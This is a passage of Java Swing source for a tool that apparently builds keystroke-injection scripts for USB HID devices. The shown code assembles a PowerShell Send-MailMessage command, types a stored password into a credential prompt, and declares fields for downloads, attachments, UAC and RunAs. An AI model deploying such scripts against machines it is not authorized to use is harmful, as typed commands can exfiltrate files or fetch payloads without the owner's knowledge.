                                "$To = \\\""+tbxReceiverEmail.getText()+"\\\"\\n" +
                                "$Subject = \\\""+ tbxSubject.getText() +"\\\"\\n" +
                                "$Body = \\\""+ tbxMessage.getText() +"\\\"\\n" +
                                "$Creds = (Get-Credential -Credential \\\"$MyEmail\\\")\\n") +
                                addDelay("500") +
                                sendString(tbxPassword.getText() + "\\n") + 
                                addDelay("500") +
                                sendString("Start-Sleep 2; " +
                                "Send-MailMessage -To $to -From $MyEmail -Subject $Subject -Body $Body -SmtpServer $SMTP -Credential $Creds -UseSsl -Port "+ tbxPort.getText()) + 
                        sendKeyStroke("KEY_ENTER");
            if(chkDefaultDelay.isSelected())
                scriptText += addDelay(tbxDefaultDelay.getText());
        }
        
        txtbScript.setText(scriptText);
    }//GEN-LAST:event_btnSendMailActionPerformed

    /**
     * @param args the command line arguments
     */
    public static void main(String args[]) {
        /* Set the Nimbus look and feel */
        //<editor-fold defaultstate="collapsed" desc=" Look and feel setting code (optional) ">
        /* If Nimbus (introduced in Java SE 6) is not available, stay with the default look and feel.
         * For details see http://download.oracle.com/javase/tutorial/uiswing/lookandfeel/plaf.html 
         */
        try {
            for (javax.swing.UIManager.LookAndFeelInfo info : javax.swing.UIManager.getInstalledLookAndFeels()) {
                if ("Windows".equals(info.getName())) {
                    javax.swing.UIManager.setLookAndFeel(info.getClassName());
                    break;
                }
            }
        } catch (ClassNotFoundException ex) {
            java.util.logging.Logger.getLogger(digiScriptWriterF.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);
        } catch (InstantiationException ex) {
            java.util.logging.Logger.getLogger(digiScriptWriterF.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);
        } catch (IllegalAccessException ex) {
            java.util.logging.Logger.getLogger(digiScriptWriterF.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);
        } catch (javax.swing.UnsupportedLookAndFeelException ex) {
            java.util.logging.Logger.getLogger(digiScriptWriterF.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);
        }
        //</editor-fold>

        /* Create and display the form */
        java.awt.EventQueue.invokeLater(new Runnable() {
            public void run() {
                new digiScriptWriterF().setVisible(true);
            }
        });
    }
    
    private void setIcon() {
        setIconImage(Toolkit.getDefaultToolkit().getImage(getClass().getResource("ducky.png"))); //To change body of generated methods, choose Tools | Templates.
    }

    // Variables declaration - do not modify//GEN-BEGIN:variables
    private javax.swing.JButton btnAddComment;
    private javax.swing.JButton btnAddCustomKey;
    private javax.swing.JButton btnAddDelay;
    private javax.swing.JButton btnCaps;
    private javax.swing.JButton btnClearScript;
    private javax.swing.JButton btnDownload;
    private javax.swing.JButton btnEnter;
    private javax.swing.JButton btnEsc;
    private javax.swing.JButton btnGUI;
    private javax.swing.JButton btnRunAs;
    private javax.swing.JButton btnRunBox;
    private javax.swing.JButton btnSave;
    private javax.swing.JButton btnSendMail;
    private javax.swing.JButton btnTab;
    private javax.swing.JButton btnText2Write;
    private javax.swing.JButton btnUAC;
    private javax.swing.JCheckBox chkAttachment;
    private javax.swing.JCheckBox chkDefaultDelay;
    private javax.swing.JCheckBox chkExecute;
    private javax.swing.JButton jButton1;
    private javax.swing.JButton jButton3;
    private javax.swing.JLabel jLabel1;
    private javax.swing.JLabel jLabel2;
    private javax.swing.JLabel jLabel5;
    private javax.swing.JLabel jLabel6;
    private javax.swing.JPanel jPanel1;
    private javax.swing.JPanel jPanel11;
    private javax.swing.JPanel jPanel12;
    private javax.swing.JPanel jPanel13;
    private javax.swing.JPanel jPanel2;
    private javax.swing.JPanel jPanel3;
    private javax.swing.JPanel jPanel4;
    private javax.swing.JPanel jPanel5;
    private javax.swing.JPanel jPanel6;
    private javax.swing.JPanel jPanel7;
    private javax.swing.JPanel jPanel8;
    private javax.swing.JPanel jPanel9;
    private javax.swing.JScrollPane jScrollPane1;
    private javax.swing.JScrollPane jScrollPane2;
    private javax.swing.JScrollPane jScrollPane3;
    private javax.swing.JScrollPane jScrollPane4;
    private javax.swing.JTabbedPane jTabbedPane1;
    private javax.swing.JTextArea jTextArea1;
    private javax.swing.JTextArea jTextArea2;
    private javax.swing.JLabel lblAddDelay;
    private javax.swing.JLabel lblDLPath;
    private javax.swing.JLabel lblDLURL;
    private javax.swing.JLabel lblDrag;
    private javax.swing.JLabel lblSendEmailTo;
    private javax.swing.JLabel lblSenderEmail;
    private javax.swing.JLabel lblSenderPass;
    private javax.swing.JLabel lblSubject;
    private javax.swing.JPanel plDragDrop;
    private javax.swing.JTextField tbxAddDelay;
    private javax.swing.JTextField tbxAttachPath;
    private javax.swing.JTextField tbxComment;
    private javax.swing.JTextPane tbxConsole;
    private javax.swing.JTextField tbxCustomKey;
    private javax.swing.JTextField tbxDefaultDelay;
    private javax.swing.JTextField tbxDownloadPath;
    private javax.swing.JTextField tbxDownloadURL;
    private javax.swing.JTextField tbxMessage;
    private javax.swing.JPasswordField tbxPassword;
    private javax.swing.JTextField tbxPort;
    private javax.swing.JTextField tbxReceiverEmail;
    private javax.swing.JTextField tbxSMTP;
    private javax.swing.JTextField tbxSenderEmail;
    private javax.swing.JTextField tbxSubject;
    private javax.swing.JTextField tbxText2Write;
    private javax.swing.JTextArea txtbScript;
    // End of variables declaration//GEN-END:variables
}
